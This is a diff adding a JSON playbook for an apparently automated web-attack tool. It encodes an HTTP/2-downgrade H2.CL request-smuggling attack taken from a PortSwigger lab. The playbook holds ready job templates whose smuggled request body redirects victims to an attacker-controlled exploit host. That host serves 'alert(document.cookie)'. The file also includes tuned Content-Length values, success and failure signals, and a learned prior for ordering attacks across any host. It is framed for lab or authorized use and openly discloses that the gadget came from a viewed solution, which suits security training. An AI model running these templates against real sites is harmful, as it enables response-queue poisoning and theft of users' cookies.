@@ -1,0 +1,143 @@
+{
+  "schema": "omnislash.playbook/v1",
+  "id": "h2-cl-resources-redirect",
+  "title": "HTTP/2 downgrade H2.CL desync to an external script redirect",
+  "provenance": {
+    "kind": "solution-derived",
+    "autonomous_discovery": false,
+    "source_url": "https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling",
+    "disclosure": "The decisive /resources + Content-Length: 5 + x=1 shape was seen in an accidentally displayed Solution section. OmniSlash executed, framed, varied and recorded it; it did not invent the gadget."
+  },
+  "applies_to": {
+    "protocol_edge": "h2->h1.1",
+    "probe": "h2-cl",
+    "tls": "h2",
+    "tech_stack": ["h2"],
+    "gadget": "external-script-redirect",
+    "authorization": "Only against an in-scope lab or an explicitly authorized target."
+  },
+  "preconditions": [
+    "Front-end negotiates HTTP/2 and downgrades to HTTP/1.1 toward the back-end.",
+    "An attacker-controlled exploit server can serve a file at /resources with content type application/javascript and body alert(document.cookie).",
+    "The lab victim browser visits the target page and imports the queued response."
+  ],
+  "job_templates": {
+    "verify": {
+      "target": {
+        "addr": "{{TARGET_ADDR}}",
+        "host": "{{TARGET_HOST}}",
+        "path": "/"
+      },
+      "tls": "h2",
+      "probe": "h2-cl",
+      "tech_stack": ["h2"],
+      "declared_length": 0,
+      "method": "POST",
+      "path": "/",
+      "body": "GET /resources HTTP/1.1\r\nHost: {{EXPLOIT_HOST}}\r\nContent-Length: 5\r\n\r\nx=1",
+      "skip_victim": false,
+      "victim_method": "GET",
+      "victim_path": "/",
+      "success_contains": "alert(document.cookie)",
+      "attempts": 1,
+      "timeout": "8s",
+      "idle": "2s",
+      "retry_delay": "0s"
+    },
+    "solve": {
+      "target": {
+        "addr": "{{TARGET_ADDR}}",
+        "host": "{{TARGET_HOST}}",
+        "path": "/"
+      },
+      "tls": "h2",
+      "probe": "h2-cl",
+      "tech_stack": ["h2"],
+      "declared_length": 0,
+      "method": "POST",
+      "path": "/",
+      "body": "GET /resources HTTP/1.1\r\nHost: {{EXPLOIT_HOST}}\r\nContent-Length: 5\r\n\r\nx=1",
+      "skip_victim": true,
+      "success_contains": "",
+      "attempts": 1,
+      "timeout": "8s",
+      "idle": "2s",
+      "retry_delay": "0s",
+      "interval": "2s"
+    }
+  },
+  "validated_parameters": {
+    "outer_content_length": 0,
+    "smuggled_path": "/resources",
+    "smuggled_content_length": 5,
+    "literal_body": "x=1",
+    "literal_body_bytes": 3,
+    "exploit_file_body": "alert(document.cookie)",
+    "exploit_file_content_type": "application/javascript; charset=utf-8",
+    "observed_working_smuggled_cl": [4, 5, 6, 7, 8],
+    "observed_non_working_smuggled_cl": [1, 2, 3],
+    "poison_interval": "2s"
+  },
+  "response_signals": [
+    {
+      "id": "h2_cl_queue_shifted",
+      "confidence": "medium",
+      "match": "HTTP/2 302 whose Location points to the attacker-controlled exploit host, observed on a request that did not send the smuggled request",
+      "meaning": "The smuggled response was delivered to a different front-end request."
+    },
+    {
+      "id": "h2_cl_confirmed",
+      "confidence": "high",
+      "match": "A victim response body contains the configured success marker",
+      "meaning": "Response-queue poisoning is confirmed by OmniSlash."
+    }
+  ],
+  "negative_signals": [
+    {
+      "id": "backend_rejected_prefix",
+      "match": "200 followed by 400 {\"error\":\"Invalid request\"}",
+      "meaning": "Surplus DATA reached the back-end, but no usable response shift followed."
+    },
+    {
+      "id": "no_marker",
+      "match": "Only 200/404 responses after poison and victim requests",
+      "meaning": "The desync did not produce a victim-visible queue shift."
+    }
+  ],
+  "evidence": [
+    {
+      "path": "runs/psa-0a9700ce03a9f009802d038900760085/daemon-resources-cl5-audit.jsonl",
+      "observation": "Synthetic victim received 302 with Location to the exploit server /resources/."
+    },
+    {
+      "path": "runs/psa-0a9700ce03a9f009802d038900760085/daemon-resources-cl1-audit.jsonl",
+      "observation": "Smuggled CL 1 produced no external redirect."
+    },
+    {
+      "path": "runs/psa-0a9700ce03a9f009802d038900760085/daemon-solve-audit.jsonl",
+      "observation": "11 poison-only attempts left the queued response for the real browser."
+    },
+    {
+      "path": "runs/psa-0a9700ce03a9f009802d038900760085/exploit-log-final.html",
+      "observation": "Victim Chrome requested GET /resources/ after the attack."
+    },
+    {
+      "path": "runs/psa-0a9700ce03a9f009802d038900760085/RESULT.md",
+      "observation": "Full honesty report including accidental solution exposure."
+    }
+  ],
+  "learning": {
+    "seed_global_prior": true,
+    "key": {
+      "host": "*",
+      "tls": "h2",
+      "probe": "h2-cl",
+      "tech_stack": "h2"
+    },
+    "signal": "h2_cl_queue_shifted",
+    "attempts": 3,
+    "successes": 2,
+    "provenance": "solution-derived",
+    "note": "Curated prior from one lab instance. It orders candidates only; every run still needs byte-level evidence."
+  }
+}
